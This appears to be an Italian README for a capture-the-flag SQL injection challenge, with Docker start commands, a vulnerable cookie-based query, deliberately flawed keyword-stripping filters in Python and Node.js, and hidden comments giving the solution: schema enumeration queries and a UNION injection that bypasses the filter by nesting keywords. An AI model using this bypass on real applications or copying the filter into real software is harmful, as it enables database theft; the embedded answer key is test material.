# Challenge: Cookie Tampering & SQL Injection

## Descrizione
Hai accesso al codice sorgente di un'applicazione web con diverse vulnerabilità interessanti:
- Una **SQL Injection nella registrazione** 
- Una **Cookie Tampering vulnerability** nella pagina del profilo 🍪
- Un tentativo (fallito) di filtrare input pericolosi con una funzione bypassabile

L'obiettivo? Sfruttare queste vulnerabilità per recuperare la flag nascosta nella tabella!

## Obiettivo
- **Sfrutta la SQL injection nel cookie 'uid' della pagina profilo, stando attento al filtro utilizzato per l'esecuzione della query**
- **Costruisci una UNION injection per leggere la flag dalla tabella segreta**
- **Recupera il valore di della flag**

## Avviare il server:
```bash
docker pull ghcr.io/ax3lt/sqli-ch2
docker run -p 80:80 ghcr.io/ax3lt/sqli-ch2
```

## Suggerimenti
- Il codice nella pagina profilo usa questa query vulnerabile:
```sql
SELECT username FROM users WHERE id = [valore-del-cookie]
```

### Filtro (Python):
```python
def filter_query(query):
    keywords = ["SELECT", "FROM", "WHERE", "OR", "AND", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER", "CREATE", "TABLE", "DATABASE", "UNION", "JOIN"]
    for keyword in keywords:
        query = query.replace(keyword, "")
    return query
```

### Filtro (Node.js):
```javascript
function filterQuery(query) {
    const keywords = ["SELECT", "FROM", "WHERE", "OR", "AND", "INSERT", "UPDATE", "DELETE", "DROP", "ALTER", "CREATE", "TABLE", "DATABASE", "UNION", "JOIN"];
    return keywords.reduce((filteredQuery, keyword) => {
        return filteredQuery.replace(keyword, "");
    }, query);
}
```

[//]: # (Prima bisogna spiegare che si possono ottenere info sui db e le loro tabelle con la query:)

[//]: # (```sql)

[//]: # ( SELECT table_name FROM ) 

[//]: # (information_schema.tables WHERE)

[//]: # ( table_schema=database() 

[//]: # (```)

[//]: # (E per ottenere i nomi delle colonne di una tabella si può usare:)

[//]: # (```sql)

[//]: # (SELECT column_name FROM information_schema.columns WHERE table_name='...')

[//]: # (```)

[//]: # (Inj finale pre filter:)

[//]: # (```sql)

[//]: # (2 UNION SELECT mypersonalflag FROM flagrandomwordss -- a)

[//]: # (```)

[//]: # ()
[//]: # (Inj finale post filter:)

[//]: # (```sql)

[//]: # (2 UNIOUNIONN SELECSELECTT mypersonalflag FROFROMM flagrandomwordss -- a)

[//]: # (```)
